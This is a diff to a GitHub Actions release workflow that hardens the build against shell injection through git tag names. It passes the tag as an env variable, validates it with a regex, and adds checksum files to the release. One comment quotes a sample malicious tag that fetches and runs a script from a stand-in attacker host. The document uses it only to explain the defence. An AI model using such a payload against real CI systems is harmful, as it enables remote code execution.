@@ -33,19 +33,44 @@ jobs:
         env:
           GOOS: ${{ matrix.goos }}
           GOARCH: ${{ matrix.goarch }}
+          # Passed as data via `env:`, not interpolated into the script
+          # text below -- a tag name is attacker-controlled (anyone who
+          # can push a `v*` tag), and a version like
+          # `v1.2.3$(curl evil.example|sh)` is a *valid* git ref. Putting
+          # `${{ github.ref_name }}` directly into the `run:` string
+          # would have the runner's shell parse and execute that
+          # command-substitution syntax before this job ever gets to
+          # `go build`. Referenced below only as "$VERSION", an ordinary
+          # variable expansion that never re-parses its own value as
+          # shell syntax.
+          VERSION: ${{ github.ref_name }}
         run: |
+          # A shell glob's trailing "*" matches any characters, including
+          # shell metacharacters, so a `case` pattern here would not
+          # actually anchor the end of the string -- grep -E with ^...$
+          # does.
+          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
+            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
+            exit 1
+          fi
+
           EXT=""
           if [ "$GOOS" = "windows" ]; then
             EXT=".exe"
           fi
 
           OUTPUT_NAME="git-secret-${GOOS}-${GOARCH}${EXT}"
-          go build -v -o "${OUTPUT_NAME}" -ldflags="-s -w -X main.version=${{ github.ref_name }}" .
+          go build -v -o "${OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" .
           echo "ASSET_PATH=${OUTPUT_NAME}" >> $GITHUB_ENV
 
           KUBECTL_OUTPUT_NAME="kubectl-secret-${GOOS}-${GOARCH}${EXT}"
-          go build -v -o "${KUBECTL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${{ github.ref_name }}" ./cmd/kubectl-secret
+          go build -v -o "${KUBECTL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/kubectl-secret
           echo "KUBECTL_ASSET_PATH=${KUBECTL_OUTPUT_NAME}" >> $GITHUB_ENV
+
+      - name: Checksum binaries
+        run: |
+          sha256sum "${{ env.ASSET_PATH }}" > "${{ env.ASSET_PATH }}.sha256"
+          sha256sum "${{ env.KUBECTL_ASSET_PATH }}" > "${{ env.KUBECTL_ASSET_PATH }}.sha256"
 
       - name: Upload Release Asset
         uses: softprops/action-gh-release@v2
@@ -53,7 +78,9 @@ jobs:
         with:
           files: |
             ${{ env.ASSET_PATH }}
+            ${{ env.ASSET_PATH }}.sha256
             ${{ env.KUBECTL_ASSET_PATH }}
+            ${{ env.KUBECTL_ASSET_PATH }}.sha256
           # The release will be created automatically if it doesn't exist,
           # using the tag name as the release name.
           # You can customize release notes, etc. here if needed.
